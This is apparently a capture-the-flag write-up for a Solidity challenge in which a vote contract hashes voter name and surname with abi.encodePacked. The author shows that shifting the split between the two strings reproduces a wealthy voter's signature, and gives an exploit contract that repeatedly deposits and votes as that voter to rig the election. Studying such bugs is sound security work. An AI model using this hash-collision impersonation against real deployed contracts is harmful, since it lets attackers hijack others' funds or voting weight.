Pretty simple bug in the Target contract.
To get the flag, "CIM" needs to reach the target vote amount that is : 1000e18


So the Setup contract creates 2 `NotADemocraticElection` contract with the name "ALF" and "CIM".
Also, when the Setup contract is created, a rich guy named "Satoshi" using the surname "Nakamoto" deposit 100 ether for fun.


Taking a look at the `depositVoteCollateral()`, the function gets the voterSig by calling `getVoterSig()` then it adds to the voters 'weight' more 'weight' directly by the voterSig.
This means that the weight of a voter is determined by the sig.

When i take a look at the `getVoterSig()` function, i see that it uses `abi.encodePacked(_name, _surname)` and its vulnerable to a hash collision. This means that `("A", "BC")` is the same output as `("AB", "C")`
I tested calling `getVoterSig()` using the name "S" and the surname "atoshiNakamoto" and it returns the same sig as "Satoshi" "Nakamoto". That means i can manipulate the weight of "Satoshi" by faking the sig.



Here a simple exploit contract but i wasnt able to deploy it due to low eth balance lol.
But the concept is the same. Manually, i used `depositVoteCollateral()` 10 times with the same name but not the same.... and voted as him 10 times. So "CIM" won the election.

```solidity
// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.25;

import {NotADemocraticElection} from "./NotADemocraticElection.sol";

contract Exploit {
    NotADemocraticElection constant C = NotADemocraticElection(0x0e6188F0743E13f4EEE7B1a083754147A7D07beD);

    // vote 10 times, then check if Solved by calling manually isSolved from Setup contract
    function exp() external  {
        C.depositVoteCollateral("S", "atoshiNakamoto");
        C.vote(0x43494d, "S", "atoshiNakamoto");

        C.depositVoteCollateral("Sa", "toshiNakamoto");
        C.vote(0x43494d, "Sa", "toshiNakamoto");

        C.depositVoteCollateral("Sat", "oshiNakamoto");
        C.vote(0x43494d, "Sat", "oshiNakamoto");

        C.depositVoteCollateral("Sato", "shiNakamoto");
        C.vote(0x43494d, "Sato", "shiNakamoto");

        C.depositVoteCollateral("Satos", "hiNakamoto");
        C.vote(0x43494d, "Satos", "hiNakamoto");

        C.depositVoteCollateral("Satosh", "iNakamoto");
        C.vote(0x43494d, "Satosh", "iNakamoto");

        C.depositVoteCollateral("SatoshiN", "akamoto");
        C.vote(0x43494d, "SatoshiN", "akamoto");

        C.depositVoteCollateral("SatoshiNa", "kamoto");
        C.vote(0x43494d, "SatoshiNa", "kamoto");

        C.depositVoteCollateral("SatoshiNak", "amoto");
        C.vote(0x43494d, "SatoshiNak", "amoto");

        C.depositVoteCollateral("SatoshiNaka", "moto");
        C.vote(0x43494d, "SatoshiNaka", "moto");
    }
}
```